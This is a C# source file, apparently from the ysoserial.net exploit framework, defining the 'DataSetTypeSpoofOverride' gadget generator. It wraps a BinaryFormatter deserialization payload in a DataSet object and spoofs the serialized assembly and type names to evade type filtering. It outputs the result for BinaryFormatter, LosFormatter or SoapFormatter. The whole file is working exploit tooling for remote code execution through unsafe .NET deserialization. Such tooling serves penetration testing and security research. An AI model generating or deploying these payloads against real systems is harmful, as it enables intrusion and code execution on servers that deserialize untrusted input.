using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.ConstrainedExecution;
using System.Runtime.Serialization;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using NDesk.Options;
using ysoserial.Helpers;

namespace ysoserial.Generators
{
    class DataSetTypeSpoofOverrideGenerator : DataSetTypeSpoofGenerator
    {
        string assemblyName = "mscorlib";
        string fullTypeName = "System.Data.DataSet, x=]";
        public override string Name()
        {
            return "DataSetTypeSpoofOverride";
        }

        public override string AdditionalInfo()
        {
            return base.AdditionalInfo() + 
                "\nThis version adds options for overriding the assembly name and full type name in GetObjectData method.";
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            byte[] binaryFormatterPayload;
            if (BridgedPayload != null)
            {
                binaryFormatterPayload = (byte[])BridgedPayload;
            }
            else
            {
                binaryFormatterPayload = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
            }


            DataSetSpoofOverrideMarshal payloadDataSetMarshal = new DataSetSpoofOverrideMarshal(binaryFormatterPayload);
            payloadDataSetMarshal.AssemblyName = assemblyName;
            payloadDataSetMarshal.FullTypeName = fullTypeName;
            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("soapformatter", StringComparison.OrdinalIgnoreCase))
            {
                return Serialize(payloadDataSetMarshal, formatter, inputArgs);
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {
                { "DataSetAssemblyName=", "Name of DataSet assembly", v => assemblyName = v.Replace(",", ", ") },
                { "DataSetFullTypeName=", "Full type name of DataSet assembly", v => fullTypeName = v },
            };
            return options;
        }
    }

    [Serializable]
    public class DataSetSpoofOverrideMarshal : DataSetSpoofMarshal
    {
        public DataSetSpoofOverrideMarshal(byte[] bfPayload) : base(bfPayload)
        {
        }

        public string AssemblyName { get; set; }
        public string FullTypeName { get; set; }

        public override void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            base.GetObjectData(info, context);
            info.AssemblyName = AssemblyName;
            info.FullTypeName = FullTypeName;
        }
    }
}
